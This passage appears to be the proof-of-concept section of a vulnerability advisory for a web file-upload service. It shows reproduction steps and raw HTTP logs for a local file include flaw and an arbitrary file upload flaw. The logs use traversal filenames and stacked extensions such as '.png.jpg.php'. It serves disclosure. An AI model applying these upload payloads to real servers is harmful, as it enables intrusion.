@@ -1,0 +1,90 @@
+Proof of Concept (PoC):
+=======================
+1.1
+The local file include web vulnerability can be exploited by local attackers without privileged application user account or user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.
+
+PoC: Index File Dir Listing (http://www.example.com:8080)
+<a href="/<./[LOCAL FILE INCLUDE VULNERABILITY!].png" target="_blank"> <./[LOCAL FILE INCLUDE VULNERABILITY!].png 
+</a></td></tr></table></div></body>
+</html></iframe></a>
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://www.example.com:8080/uploadfile Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[-1] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[www.example.com:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://www.example.com:8080/]
+      Connection[keep-alive]
+   POST-Daten:
+      POST_DATA[-----------------------------165081174024576
+Content-Disposition: form-data; name="upload1"; filename="./[LOCAL FILE INCLUDE VULNERABILITY!].*"
+Content-Type: image/png
+
+Status: 200[OK] 
+GET http://www.example.com:8080/./[LOCAL FILE INCLUDE VULNERABILITY!].* Load Flags[LOAD_DOCUMENT_URI  ] Größe des Inhalts[0] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[www.example.com:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://www.example.com:8080/uploadfile]
+      Connection[keep-alive]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[0]
+      Date[Tue, 29 Jul 2014 14:32:09 GMT]
+
+
+Reference(s):
+http://www.example.com:8080/
+http://www.example.com:8080/uploadfile
+
+
+1.2
+The arbitrary file upload web vulnerability can be exploited by local attackers without privileged application user account or user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.
+
+Standard Link to View and Download:
+http://www.example.com:8080/[x].png
+
+PoC: 200[OK] GET
+http://www.example.com:8080/[ARBITRARY FILE UPLOAD VULNERABILITY!].png.jpg.php.js.html
+http://www.example.com:8080/[ARBITRARY FILE UPLOAD VULNERABILITY!].png.jpg.php
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+ POST http://www.example.com:8080/uploadfile Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[-1] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[www.example.com:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://www.example.com:8080/]
+      Connection[keep-alive]
+   POST-Daten:
+   POST_DATA[-----------------------------253371365330237
+Content-Disposition: form-data; name="upload1"; filename="[ARBITRARY FILE UPLOAD VULNERABILITY!].png.jpg.php.js.html.jpg.png"
+Content-Type: image/png
+
+Status: 200[OK] 
+GET http://www.example.com:8080/[ARBITRARY FILE UPLOAD VULNERABILITY!].png.jpg.php.js.html.jpg.png Load Flags[LOAD_DOCUMENT_URI  ] Größe des Inhalts[0] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[www.example.com:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://www.example.com:8080/uploadfile]
+      Connection[keep-alive]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[0]
